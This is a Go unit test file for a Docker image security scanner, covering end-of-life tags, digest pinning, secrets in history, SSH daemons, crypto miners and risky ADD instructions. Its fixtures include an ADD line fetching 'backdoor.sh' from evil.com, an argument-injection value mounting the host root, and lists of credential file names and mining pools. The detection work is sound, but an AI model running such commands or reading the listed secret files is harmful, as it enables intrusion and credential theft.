package scanner

import (
	"testing"

	"https://github.com/kariemoorman/dockeraudit/internal/types"
)

// ── eolTagMatches ─────────────────────────────────────────────────────────────

func TestEolTagMatches(t *testing.T) {
	tests := []struct {
		imageTag string
		eolTag   string
		want     bool
	}{
		// Exact match
		{"18.04", "18.04", true},
		{"9", "9", true},
		{"12", "12", true},
		// Separator match (-/./_ suffix)
		{"18.04-slim", "18.04", true},
		{"18.04.1", "18.04", true},
		{"18.04_custom", "18.04", true},
		{"9-stretch", "9", true},
		{"12-alpine", "12", true},
		// Prefix match (eolTag ends with ".")
		{"9.6.3", "9.", true},
		{"9.6.3-alpine", "9.", true},
		{"9.0", "9.", true},
		// Must NOT match — "10" should not match "100"
		{"100", "10", false},
		// Must NOT match — different version
		{"20.04", "18.04", false},
		{"10", "9", false},
		{"13", "12", false},
		// Must NOT match — suffix starts with digit (not a separator)
		{"18.044", "18.04", false},
		// Non-EOL tags
		{"latest", "18.04", false},
		{"lts", "9", false},
		{"", "18.04", false},
	}

	for _, tc := range tests {
		got := eolTagMatches(tc.imageTag, tc.eolTag)
		if got != tc.want {
			t.Errorf("eolTagMatches(%q, %q) = %v, want %v",
				tc.imageTag, tc.eolTag, got, tc.want)
		}
	}
}

// ── imageNameTag ──────────────────────────────────────────────────────────────

func TestImageNameTag(t *testing.T) {
	tests := []struct {
		ref      string
		wantName string
		wantTag  string
	}{
		// Plain name — no tag → "latest"
		{"ubuntu", "ubuntu", "latest"},
		// Simple name:tag
		{"ubuntu:18.04", "ubuntu", "18.04"},
		{"redis:7", "redis", "7"},
		{"node:12-alpine", "node", "12-alpine"},
		// Registry prefix
		{"docker.io/library/postgres:16-alpine", "postgres", "16-alpine"},
		{"myregistry.com:5000/myapp:v2", "myapp", "v2"},
		{"gcr.io/myproject/myimage:v1", "myimage", "v1"},
		// Digest only — tag should be "latest"
		{"gcr.io/myproject/myimage@sha256:abc123def456", "myimage", "latest"},
		// Tag + digest — tag extracted before digest is stripped
		{"gcr.io/myproject/myimage:v2@sha256:abc123def456", "myimage", "v2"},
		// Uppercase normalised
		{"Ubuntu:18.04", "ubuntu", "18.04"},
		{"NGINX:ALPINE", "nginx", "alpine"},
	}

	for _, tc := range tests {
		name, tag := imageNameTag(tc.ref)
		if name != tc.wantName || tag != tc.wantTag {
			t.Errorf("imageNameTag(%q) = (%q, %q), want (%q, %q)",
				tc.ref, name, tag, tc.wantName, tc.wantTag)
		}
	}
}

// ── knownSecretFileNames ──────────────────────────────────────────────────────

func TestKnownSecretFileNames_NonEmpty(t *testing.T) {
	if len(knownSecretFileNames) == 0 {
		t.Fatal("knownSecretFileNames must not be empty")
	}
}

func TestKnownSecretFileNames_RequiredEntries(t *testing.T) {
	required := []string{
		".env",
		"id_rsa",
		"id_ed25519",
		"credentials",
		".npmrc",
		".pypirc",
		"wp-config.php",
		".vault-token",
	}
	nameSet := make(map[string]bool, len(knownSecretFileNames))
	for _, n := range knownSecretFileNames {
		nameSet[n] = true
	}
	for _, r := range required {
		if !nameSet[r] {
			t.Errorf("knownSecretFileNames is missing expected entry: %q", r)
		}
	}
}

// ── minerBinaryNames ──────────────────────────────────────────────────────────

func TestMinerBinaryNames_NonEmpty(t *testing.T) {
	if len(minerBinaryNames) == 0 {
		t.Fatal("minerBinaryNames must not be empty")
	}
}

func TestMinerBinaryNames_RequiredEntries(t *testing.T) {
	required := []string{"xmrig", "minerd", "cpuminer"}
	nameSet := make(map[string]bool, len(minerBinaryNames))
	for _, n := range minerBinaryNames {
		nameSet[n] = true
	}
	for _, r := range required {
		if !nameSet[r] {
			t.Errorf("minerBinaryNames is missing expected entry: %q", r)
		}
	}
}

// ── minerPoolPatterns ─────────────────────────────────────────────────────────

func TestMinerPoolPatterns_NonEmpty(t *testing.T) {
	if len(minerPoolPatterns) == 0 {
		t.Fatal("minerPoolPatterns must not be empty")
	}
}

func TestMinerPoolPatterns_RequiredEntries(t *testing.T) {
	required := []string{"pool.minexmr.com", "xmrpool.", "moneroocean."}
	nameSet := make(map[string]bool, len(minerPoolPatterns))
	for _, n := range minerPoolPatterns {
		nameSet[n] = true
	}
	for _, r := range required {
		if !nameSet[r] {
			t.Errorf("minerPoolPatterns is missing expected entry: %q", r)
		}
	}
}

// ── eolImages table ───────────────────────────────────────────────────────────

func TestEolImages_NonEmpty(t *testing.T) {
	if len(DefaultEOLImages) == 0 {
		t.Fatal("DefaultEOLImages table must not be empty")
	}
}

func TestEolImages_RequiredEntries(t *testing.T) {
	type check struct{ name, tag string }
	required := []check{
		{"ubuntu", "18.04"},
		{"ubuntu", "16.04"},
		{"debian", "9"},
		{"node", "12"},
		{"python", "2."}, // prefix entry — matches all Python 2.x
	}
	for _, r := range required {
		found := false
		for _, e := range DefaultEOLImages {
			if e.Name == r.name && e.Tag == r.tag {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("DefaultEOLImages missing expected entry: {%q, %q}", r.name, r.tag)
		}
	}
}

func TestCustomEOLImages(t *testing.T) {
	// Scanner with custom EOL list should use it instead of defaults
	s := &ImageScanner{
		Image: "custom:1.0",
		CustomEOLImages: []EOLEntry{
			{"custom", "1.0", "Custom image 1.0 — EOL"},
		},
	}
	list := s.eolList()
	if len(list) != 1 {
		t.Fatalf("expected 1 custom EOL entry, got %d", len(list))
	}
	if list[0].Name != "custom" {
		t.Errorf("expected custom EOL entry, got %s", list[0].Name)
	}

	// Scanner without custom list should use defaults
	s2 := &ImageScanner{Image: "test:latest"}
	list2 := s2.eolList()
	if len(list2) != len(DefaultEOLImages) {
		t.Errorf("expected %d default entries, got %d", len(DefaultEOLImages), len(list2))
	}
}

// ── ImageScanner input validation ─────────────────────────────────────────────

func TestImageScanner_RejectsDashPrefix(t *testing.T) {
	s := NewImageScanner("--volume /:/host")
	_, err := s.Scan(nil) //nolint:staticcheck // nil ctx is intentional — validation runs before ctx use
	if err == nil {
		t.Fatal("expected error for image reference starting with '-', got nil")
	}
}

// ── Unit tests for image check functions (TASK-7.14) ─────────────────────────

func TestCheckDigestPinning(t *testing.T) {
	tests := []struct {
		name   string
		image  string
		digest []string
		want   types.Status
	}{
		{"pinned by digest", "nginx@sha256:abc123", []string{"nginx@sha256:abc123"}, types.StatusPass},
		{"has repo digest but tag ref", "nginx:latest", []string{"nginx@sha256:abc123"}, types.StatusWarn},
		{"no digest at all", "nginx:latest", nil, types.StatusFail},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: tc.image}
			inspect := &imageInspect{RepoDigests: tc.digest}
			f := s.checkDigestPinning(inspect)
			if f.Status != tc.want {
				t.Errorf("checkDigestPinning(%q) status = %s, want %s", tc.image, f.Status, tc.want)
			}
		})
	}
}

func TestCheckNonRootUser(t *testing.T) {
	tests := []struct {
		name string
		user string
		want types.Status
	}{
		{"empty user (root)", "", types.StatusFail},
		{"explicit root", "root", types.StatusFail},
		{"uid 0", "0", types.StatusFail},
		{"non-root user", "appuser", types.StatusPass},
		{"non-root uid", "1000", types.StatusPass},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: "test:latest"}
			inspect := &imageInspect{}
			inspect.Config.User = tc.user
			f := s.checkNonRootUser(inspect)
			if f.Status != tc.want {
				t.Errorf("checkNonRootUser(user=%q) status = %s, want %s", tc.user, f.Status, tc.want)
			}
		})
	}
}

func TestCheckSecretsInHistory(t *testing.T) {
	tests := []struct {
		name    string
		history string
		want    types.Status
	}{
		{"clean history", "RUN apt-get install nginx", types.StatusPass},
		{"has password", "ENV DB_PASSWORD=supersecret", types.StatusFail},
		{"has api key", "RUN curl -H api_key:abc123", types.StatusFail},
		{"has private key", "COPY -----BEGIN RSA PRIVATE", types.StatusFail},
		{"empty history", "", types.StatusPass},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: "test:latest"}
			f := s.checkSecretsInHistory(tc.history)
			if f.Status != tc.want {
				t.Errorf("checkSecretsInHistory() status = %s, want %s (detail: %s)", f.Status, tc.want, f.Detail)
			}
		})
	}
}

func TestCheckSSHDaemon(t *testing.T) {
	tests := []struct {
		name       string
		entrypoint []string
		cmd        []string
		want       types.Status
	}{
		{"no sshd", []string{"/bin/sh"}, []string{"-c", "nginx"}, types.StatusPass},
		{"sshd in entrypoint", []string{"/usr/sbin/sshd", "-D"}, nil, types.StatusFail},
		{"sshd in cmd", nil, []string{"sshd"}, types.StatusFail},
		{"empty entrypoint and cmd", nil, nil, types.StatusPass},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: "test:latest"}
			inspect := &imageInspect{}
			inspect.Config.Entrypoint = tc.entrypoint
			inspect.Config.Cmd = tc.cmd
			f := s.checkSSHDaemon(inspect)
			if f.Status != tc.want {
				t.Errorf("checkSSHDaemon() status = %s, want %s", f.Status, tc.want)
			}
		})
	}
}

func TestCheckPrivilegedPorts(t *testing.T) {
	tests := []struct {
		name  string
		ports map[string]interface{}
		want  types.Status
	}{
		{"no ports", nil, types.StatusPass},
		{"high port only", map[string]interface{}{"8080/tcp": struct{}{}}, types.StatusPass},
		{"port 80", map[string]interface{}{"80/tcp": struct{}{}}, types.StatusFail},
		{"port 443", map[string]interface{}{"443/tcp": struct{}{}}, types.StatusFail},
		{"mixed", map[string]interface{}{"8080/tcp": struct{}{}, "443/tcp": struct{}{}}, types.StatusFail},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: "test:latest"}
			inspect := &imageInspect{}
			inspect.Config.ExposedPorts = tc.ports
			f := s.checkPrivilegedPorts(inspect)
			if f.Status != tc.want {
				t.Errorf("checkPrivilegedPorts() status = %s, want %s", f.Status, tc.want)
			}
		})
	}
}

func TestCheckADDInstruction(t *testing.T) {
	s := &ImageScanner{Image: "test:latest"}

	t.Run("no ADD — both controls pass", func(t *testing.T) {
		findings := s.checkADDInstruction("RUN apt-get install nginx")
		assertPass(t, findings, "IMAGE-006")
		assertPass(t, findings, "IMAGE-014")
	})

	t.Run("ADD with remote URL — IMAGE-006 fail", func(t *testing.T) {
		findings := s.checkADDInstruction("abc\t2024-01-01\tADD http://evil.com/backdoor.sh /tmp/\t0B")
		assertFail(t, findings, "IMAGE-006")
	})

	t.Run("ADD local tar archive — IMAGE-014 not flagged", func(t *testing.T) {
		findings := s.checkADDInstruction("abc\t2024-01-01\tADD ./local.tar.gz /app/\t0B")
		for _, f := range findings {
			if f.Control.ID == "IMAGE-014" && f.Status == types.StatusWarn {
				t.Errorf("tar archive ADD should not be flagged as IMAGE-014 WARN: %s", f.Detail)
			}
		}
	})

	t.Run("ADD local non-tar file — IMAGE-014 warn", func(t *testing.T) {
		findings := s.checkADDInstruction("abc\t2024-01-01\tADD ./config /app/config\t0B")
		assertWarn(t, findings, "IMAGE-014")
	})

	t.Run("empty history — both controls pass", func(t *testing.T) {
		findings := s.checkADDInstruction("")
		assertPass(t, findings, "IMAGE-006")
		assertPass(t, findings, "IMAGE-014")
	})
}

func TestCheckAdminToolsInImage(t *testing.T) {
	tests := []struct {
		name    string
		history string
		want    types.Status
	}{
		{"clean image", "RUN apt-get install curl", types.StatusPass},
		{"has psql", "RUN apt-get install psql", types.StatusWarn},
		{"has mongosh", "RUN npm install -g mongosh", types.StatusWarn},
		{"has redis-cli", "RUN apk add redis-cli", types.StatusWarn},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: "test:latest"}
			f := s.checkAdminToolsInImage(tc.history)
			if f.Status != tc.want {
				t.Errorf("checkAdminToolsInImage() status = %s, want %s", f.Status, tc.want)
			}
		})
	}
}

func TestCheckDangerousDBFlags(t *testing.T) {
	tests := []struct {
		name       string
		image      string
		entrypoint []string
		cmd        []string
		want       types.Status
	}{
		{"clean image", "nginx:latest", []string{"/bin/sh"}, nil, types.StatusPass},
		{"skip-grant-tables", "mysql:8", nil, []string{"mysqld", "--skip-grant-tables"}, types.StatusFail},
		{"mongo without auth", "mongo:7", nil, []string{"mongod"}, types.StatusFail},
		{"mongo with auth", "mongo:7", nil, []string{"mongod", "--auth"}, types.StatusPass},
		{"redis without requirepass", "redis:7", nil, []string{"redis-server"}, types.StatusWarn},
		{"redis with requirepass", "redis:7", nil, []string{"redis-server", "--requirepass", "s3cret"}, types.StatusPass},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: tc.image}
			inspect := &imageInspect{}
			inspect.Config.Entrypoint = tc.entrypoint
			inspect.Config.Cmd = tc.cmd
			f := s.checkDangerousDBFlags(inspect)
			if f.Status != tc.want {
				t.Errorf("checkDangerousDBFlags(%s) status = %s, want %s (detail: %s)", tc.image, f.Status, tc.want, f.Detail)
			}
		})
	}
}

func TestCheckEOLBaseImage(t *testing.T) {
	tests := []struct {
		name  string
		image string
		tags  []string
		want  types.Status
	}{
		{"current ubuntu", "ubuntu:22.04", []string{"ubuntu:22.04"}, types.StatusPass},
		{"eol ubuntu", "ubuntu:18.04", []string{"ubuntu:18.04"}, types.StatusFail},
		{"eol node", "node:12-alpine", []string{"node:12-alpine"}, types.StatusFail},
		{"current node", "node:20-alpine", []string{"node:20-alpine"}, types.StatusPass},
		{"latest tag skipped", "ubuntu:latest", []string{"ubuntu:latest"}, types.StatusPass},
		{"eol python 2", "python:2.7", []string{"python:2.7"}, types.StatusFail},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: tc.image}
			inspect := &imageInspect{RepoTags: tc.tags}
			f := s.checkEOLBaseImage(inspect)
			if f.Status != tc.want {
				t.Errorf("checkEOLBaseImage(%s) status = %s, want %s", tc.image, f.Status, tc.want)
			}
		})
	}
}

func TestCheckCryptoMinerInImage(t *testing.T) {
	tests := []struct {
		name    string
		history string
		env     []string
		want    types.Status
	}{
		{"clean", "RUN apt-get install nginx", nil, types.StatusPass},
		{"xmrig in history", "RUN apt-get install xmrig", nil, types.StatusFail},
		{"mining pool in env", "", []string{"POOL=stratum+tcp://pool.example.com:3333"}, types.StatusFail},
		{"pool in history", "ENV POOL=moneroocean.stream", nil, types.StatusFail},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			s := &ImageScanner{Image: "test:latest"}
			inspect := &imageInspect{}
			inspect.Config.Env = tc.env
			f := s.checkCryptoMinerInImage(inspect, tc.history)
			if f.Status != tc.want {
				t.Errorf("checkCryptoMinerInImage() status = %s, want %s", f.Status, tc.want)
			}
		})
	}
}
